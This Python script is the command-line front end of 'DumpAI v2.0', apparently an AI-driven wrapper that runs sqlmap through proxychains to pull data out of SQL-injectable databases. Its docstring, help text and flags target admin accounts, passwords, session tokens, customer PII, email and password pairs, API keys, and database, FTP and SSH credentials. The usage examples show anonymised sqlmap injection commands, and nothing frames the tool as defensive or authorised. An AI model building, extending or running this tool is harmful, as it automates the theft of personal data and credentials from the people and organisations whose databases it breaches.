#!/usr/bin/env python3
"""
DumpAI v2.0 - AI-Powered Autonomous Data Extractor

Intelligent data extraction with category-based filtering:
- user_data: Admin accounts, employees, logins, passwords, tokens
- customer_data: Customer PII (names, addresses, phones, emails)
- email_pass: Email + password/hash pairs only
- api_key: API keys, secrets, tokens
- sys_data: System access (DB creds, phpMyAdmin, FTP, SSH)

Usage:
    python3 dumpai.py -c "sqlmap command..." [options]

Examples:
    # Extract admin data and system credentials
    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --user-data --sys-data

    # Extract everything
    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --all

    # Only email+password pairs
    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --email-pass

    # Resume from saved session
    python3 dumpai.py --resume session_20241213_120000.json
"""

import argparse
import sys
import os

_dir = os.path.dirname(os.path.abspath(__file__))
if _dir not in sys.path:
    sys.path.insert(0, _dir)

from agent import DumpAgent
from memory import Memory


def main():
    parser = argparse.ArgumentParser(
        description="DumpAI v2.0 - AI-Powered Autonomous Data Extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Categories:
  --user-data     Admin/employee accounts, passwords, tokens, sessions
  --customer-data Customer PII (names, addresses, phones, emails)
  --email-pass    Email + password/hash pairs only
  --api-key       API keys, secrets, OAuth tokens
  --sys-data      System access (DB creds, phpMyAdmin, FTP, SSH)
  --all           All categories

Examples:
  python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --all
  python3 dumpai.py -c "sqlmap -r request.txt -p param -D mydb" --user-data --sys-data
        """
    )
    
    parser.add_argument("-c", "--command",
                        help="SQLMap command (with proxychains, -r, -p, etc)")
    
    parser.add_argument("--user-data", action="store_true",
                        help="Extract admin/employee data")
    parser.add_argument("--customer-data", action="store_true",
                        help="Extract customer PII")
    parser.add_argument("--email-pass", action="store_true",
                        help="Extract email+password pairs")
    parser.add_argument("--api-key", action="store_true",
                        help="Extract API keys and secrets")
    parser.add_argument("--sys-data", action="store_true",
                        help="Extract system credentials")
    parser.add_argument("--all", action="store_true",
                        help="Extract all categories")
    
    parser.add_argument("-o", "--output", default="dumpai_out",
                        help="Output directory (default: dumpai_out)")
    parser.add_argument("-p", "--parallel", type=int, default=5,
                        help="Max parallel extractions (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("--smart-search", action="store_true",
                        help="Force Smart Search mode (auto-enabled for blind injections)")
    parser.add_argument("-mr", "--max-rows", type=int, default=0,
                        help="Max rows to dump per table (0 = unlimited)")
    parser.add_argument("--no-parallel", action="store_true",
                        help="Disable parallel SQLMap processes")
    
    parser.add_argument("--resume", metavar="SESSION_FILE",
                        help="Resume from saved session file")
    
    args = parser.parse_args()
    
    if args.resume:
        print(f"[*] Resuming from: {args.resume}")
        memory = Memory.load(args.resume)
        print(f"[*] Session: {memory.session_id}")
        print(f"[*] Database: {memory.current_database}")
        print(f"[*] Tables processed: {memory.stats['tables_processed']}")
        print(f"[*] Resume not fully implemented yet")
        return
    
    if not args.command:
        parser.print_help()
        print("\n[!] Error: -c/--command is required")
        sys.exit(1)
    
    categories = []
    if args.all:
        categories = ["user_data", "customer_data", "email_pass", "api_key", "sys_data"]
    else:
        if args.user_data:
            categories.append("user_data")
        if args.customer_data:
            categories.append("customer_data")
        if args.email_pass:
            categories.append("email_pass")
        if args.api_key:
            categories.append("api_key")
        if args.sys_data:
            categories.append("sys_data")
    
    if not categories:
        categories = ["user_data", "sys_data"]
        print(f"[*] No categories specified, using default: {categories}")
    
    try:
        agent = DumpAgent(
            command=args.command,
            categories=categories,
            output_dir=args.output,
            max_parallel=args.parallel,
            verbose=args.verbose,
            smart_search=args.smart_search,
            max_rows=args.max_rows,
            parallel_sqlmap=not args.no_parallel
        )
        
        agent.run()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
